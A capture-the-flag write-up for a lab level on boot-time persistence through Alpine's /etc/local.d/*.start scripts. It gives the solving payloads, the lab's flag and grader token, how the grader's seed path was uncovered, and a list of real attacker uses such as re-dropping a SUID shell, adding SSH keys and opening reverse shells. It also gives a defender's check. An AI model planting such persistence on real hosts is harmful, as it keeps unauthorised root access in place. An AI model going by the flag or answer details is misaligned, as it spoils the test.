# L12 — ps-persistence · Stay After the Reboot
 
**Act III · Persistence and Evasion · T1543.002**
**Status:** Solved
**Flag:** `bl_35467ed6dfbdf5164361c3c28990ef68`
 
---
 
## Challenge brief
 
> Access you cannot keep is access you do not have. Install exactly one mechanism that
> brings you back after the host restarts. You are graded on it firing again, not on
> creating a file. The check restarts the host by replaying its rc-local startup, so
> that is the surface to land in.
 
MITRE tag T1543.002 is "Create or Modify System Process: RC Scripts" — using the
system's boot-time script execution mechanism to plant code that runs automatically on
every restart.
 
You land as root. The job is not to find a secret — it is to plant a persistence
mechanism that fires when the box restarts, and have that mechanism read a grader-supplied
value and write it to the proof file.
 
---
 
## How this level is different from previous ones
 
In every previous level, a secret existed on disk before you arrived. You found it,
wrote it to the proof file, and the grader confirmed it matched what was planted.
 
This level breaks that pattern. The challenge description says: "You are graded on it
firing again, not on creating a file." The grader is not checking whether you found
something — it is checking whether your code ran during the simulated restart.
 
To verify that your code actually ran (rather than you just writing a value directly),
the grader uses a token system:
 
1. **Before the simulated restart**, the grader writes a unique random token to
   `/opt/.persist-target`. You do not know this token in advance — it is generated
   fresh each time you call `verify`.
2. **During the simulated restart**, the grader runs `boot.sh`, which executes every
   executable `.start` script in `/etc/local.d/`. Your planted script runs here.
3. **After the restart**, the grader reads `/tmp/.ps-persist-proof` and checks whether
   it matches the token it wrote to `/opt/.persist-target`.
If they match, it means your script ran during the boot sequence — because that is the
only way your script could have read the token and written it to the proof file. You
cannot cheat by writing the proof file directly before calling `verify`, because you do
not know what token the grader will plant.
 
This is the core of the grading logic: the token is the grader's way of proving that
your code ran during boot, not just that a file exists.
 
### What boot.sh does
 
```sh
cat /usr/local/bin/boot.sh
```
 
```sh
#!/bin/sh
# System-startup harness. Replays every executable rc-local service, exactly as an
# init would on boot. The grader re-runs this to simulate a restart and check that a
# player's persistence mechanism re-fires. Spiked 2026-09-07: survival-graded.
for s in /etc/local.d/*.start; do [ -x "$s" ] && "$s"; done
```
 
It loops over every file matching `/etc/local.d/*.start` and runs the ones that are
executable. This is exactly what Alpine's OpenRC `local` service does on a real boot.
The grader calls this instead of actually rebooting the container, which would destroy
the session.
 
Three conditions your script must satisfy for it to be picked up:
- File must be in `/etc/local.d/`
- File name must end in `.start`
- File must be executable (`chmod +x`) — the `[ -x "$s" ]` check skips non-executable
  files silently, giving no error
### The grading sequence visualised
 
```
verify called
     │
     ▼
grader writes token → /opt/.persist-target   (e.g. "665b2fa28da95a0386b7bb221310d292")
     │
     ▼
grader calls /usr/local/bin/boot.sh
     │
     ▼
boot.sh runs /etc/local.d/persist.start     (your planted script)
     │
     ▼
your script reads /opt/.persist-target → writes to /tmp/.ps-persist-proof
     │
     ▼
grader reads /tmp/.ps-persist-proof
     │
     ├── matches token → Level solved
     └── does not match → "value written on restart is wrong"
         file missing → "no proof after the simulated restart"
```
 
The two error messages tell you exactly where in the sequence things failed:
- "no proof after the simulated restart" — your script either didn't run, isn't
  executable, or didn't write the file at all
- "the value written on restart is wrong" — your script ran and wrote something, but
  it wasn't reading from `/opt/.persist-target`
---
 
## Alpine Linux boot persistence — how it differs from Ubuntu
 
The topic note was written for Ubuntu with systemd. Alpine uses OpenRC, which works
differently.
 
### Ubuntu/systemd approach
 
On Ubuntu, rc.local is a compatibility shim. The file `/etc/rc.local` is executed by
systemd's `rc-local.service` during boot. Systemd manages service ordering,
dependencies, and parallel startup.
 
### Alpine/OpenRC approach
 
Alpine uses OpenRC as its init system. OpenRC does not use `/etc/rc.local` directly.
Instead it uses `/etc/local.d/` — a directory of shell scripts:
 
- Files ending in `.start` are executed at the end of the boot sequence (equivalent
  to rc.local on Ubuntu)
- Files ending in `.stop` are executed at shutdown
- Only executable files are run
The `local` OpenRC service reads and runs these scripts on a real Alpine boot. In this
challenge, `boot.sh` replays that same behavior to simulate a restart without actually
rebooting the container.
 
### Key differences to remember
 
| Feature | Ubuntu (systemd) | Alpine (OpenRC) |
|---|---|---|
| Boot script file | `/etc/rc.local` | `/etc/local.d/*.start` |
| Init system | systemd | OpenRC |
| Service management | `systemctl enable/start` | `rc-update add / rc-service start` |
| Service unit files | `/etc/systemd/system/*.service` | `/etc/init.d/*` |
| Check enabled services | `systemctl is-enabled <name>` | `rc-update show` |
 
---
 
## The grader's seed file — what we missed and how we found it
 
Once we understood the token system, the question became: where does the grader write
the token? We did not know this path in advance.
 
### Wrong approach: guessing
 
We tried the natural locations for transient files — `/run/` and `/tmp/` — and found
nothing. We also tried guessing specific path names like `/run/ps-persist-seed`. All
failed. Guessing paths blind is slow and unreliable.
 
### Correct approach: diagnostic payload
 
The right method is to use your persistence script as a diagnostic tool first. Instead
of writing a value, make it dump everything it can see during the simulated restart:
 
```sh
cat > /etc/local.d/persist.start << 'EOF'
#!/bin/sh
find / -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null > /tmp/.ps-debug2
env >> /tmp/.ps-debug2
EOF
chmod +x /etc/local.d/persist.start
verify
cat /tmp/.ps-debug2
```
 
When the grader runs `boot.sh`, your script runs and writes a complete list of every
file on the filesystem — including any file the grader just planted — to `/tmp/.ps-debug2`.
After `verify` returns, you read that file from your shell.
 
In the output, among hundreds of system files, one non-standard file appeared:
 
```
/opt/.persist-target
```
 
This is the grader's seed file. It was in `/opt/` — a directory we had not checked
directly because it seemed unlikely for a per-run token. But `/opt/` is where the
grader put it.
 
The diagnostic approach works for any challenge where you don't know where the grader
plants its input: use your payload to observe the environment, then use those
observations to write the real payload.
 
---
 
## Initial hypothesis
 
Root shell, persistence challenge. The challenge explicitly says the surface is rc-local
startup. On Alpine that means `/etc/local.d/*.start` scripts. Run verify first to find
the proof file name, then read `boot.sh` to understand how the grader simulates a
restart.
 
---
 
## Enumeration log
 
### Step 1 — Check the rc.local situation
 
```sh
cat /etc/rc.local 2>/dev/null
ls -la /etc/rc.local 2>/dev/null
ls -la /etc/local.d/
rc-status 2>/dev/null | grep local
```
 
Result: no `/etc/rc.local`, `/etc/local.d/` exists but is empty, `rc-status` shows
nothing for the local service. On Alpine the persistence surface is `/etc/local.d/`,
not `/etc/rc.local`.
 
---
 
### Step 2 — Run verify to see what the grader expects
 
```sh
verify
```
 
```
Not solved yet. no proof after the simulated restart
Write the value you recover to /tmp/.ps-persist-proof, then run verify again.
```
 
Proof file: `/tmp/.ps-persist-proof`. The message "no proof after the simulated
restart" means the grader ran boot.sh but the file was not there afterwards.
 
---
 
### Step 3 — Read boot.sh
 
```sh
ls /usr/local/bin/
cat /usr/local/bin/boot.sh
```
 
Reveals that `boot.sh` runs every executable `*.start` file in `/etc/local.d/`. This
is exactly the mechanism to plant into.
 
---
 
### Step 4 — First payload attempt
 
```sh
cat > /etc/local.d/persist.start << 'EOF'
#!/bin/sh
echo "persistent" > /tmp/.ps-persist-proof
EOF
chmod +x /etc/local.d/persist.start
verify
```
 
Result: "the value written on restart is wrong."
 
This tells us the script ran (the error changed from "no proof" to "wrong value"), but
`"persistent"` was not the expected token. The grader wants a specific value it
generates itself, not a hardcoded string.
 
**Conclusion:** The grader plants a token somewhere before running boot.sh. Find where.
 
---
 
### Step 5 — Diagnostic payload to find the seed file
 
```sh
cat > /etc/local.d/persist.start << 'EOF'
#!/bin/sh
find / -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null > /tmp/.ps-debug2
env >> /tmp/.ps-debug2
EOF
chmod +x /etc/local.d/persist.start
verify
cat /tmp/.ps-debug2
```
 
In the output, one non-system file stood out among all the standard Alpine files:
 
```
/opt/.persist-target
```
 
The environment dump showed nothing useful — no extra variables injected by the grader.
The token is in a file, not in the environment.
 
---
 
### Step 6 — Read the seed and confirm
 
```sh
cat /opt/.persist-target
```
 
```
665b2fa28da95a0386b7bb221310d292
```
 
A 32-character hex string — the per-session token the grader planted in `/opt/` before
running boot.sh.
 
---
 
### Step 7 — Final payload
 
```sh
cat > /etc/local.d/persist.start << 'EOF'
#!/bin/sh
cat /opt/.persist-target > /tmp/.ps-persist-proof
EOF
chmod +x /etc/local.d/persist.start
verify
```
 
Result: "Level solved: ps-persistence."
 
---
 
## What the vulnerability demonstrates
 
On a compromised box, an attacker with root can place a script in `/etc/local.d/` that
runs automatically on every reboot as root — without any user interaction, without
appearing in the process list during normal operation, and without showing up in
`crontab -l` or `ps aux`.
 
What a real attacker's payload might do:
- Re-drop a SUID shell at `/tmp/.sh` in case the defender removes it
- Re-add an SSH public key to `/root/.ssh/authorized_keys`
- Open a reverse shell to a remote server
- Re-install other persistence mechanisms that were cleaned
The defender's sweep:
 
```sh
ls -la /etc/local.d/
cat /etc/local.d/*.start 2>/dev/null
```
 
Any `.start` file not placed deliberately by an administrator is suspicious.
 
---
 
## Dead ends
 
### Hardcoded value
 
Writing a fixed string (`"persistent"`, the hostname) — both rejected. The grader
generates a unique token per `verify` call. No static value will ever match.
 
### Looking for the seed in /run/ and /tmp/
 
Natural locations for transient files — but both were empty at restart time. The grader
places its seed in `/opt/`, which is a persistent directory.
 
### Guessing the seed path
 
Tried several paths (`/run/ps-persist-seed`, `/tmp/.ps-persist-seed`) — none existed.
The correct method was the diagnostic payload, not guessing.
 
---
 
## Carryover findings
 
None. The level is self-contained.
 
---
 
## Command reference
 
| Command | What it does |
|---|---|
| `ls -la /etc/local.d/` | Check for existing boot scripts on Alpine |
| `cat /usr/local/bin/boot.sh` | Read the grader's restart simulation script |
| `cat > /etc/local.d/name.start << 'EOF' ... EOF` | Create a boot script using heredoc syntax |
| `chmod +x /etc/local.d/name.start` | Make the script executable — required for boot.sh to pick it up |
| `/usr/local/bin/boot.sh` | Manually trigger the simulated restart to test your payload |
| `cat /opt/.persist-target` | Read the grader's seed token |
| `cat /opt/.persist-target > /tmp/.ps-persist-proof` | The final payload — copy seed to proof file |
| `find / -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null` | Full filesystem dump — the diagnostic technique that revealed the seed path |
| `rc-status 2>/dev/null` | Show OpenRC service status on Alpine |
| `rc-update show` | Show which OpenRC services are enabled and at which runlevel |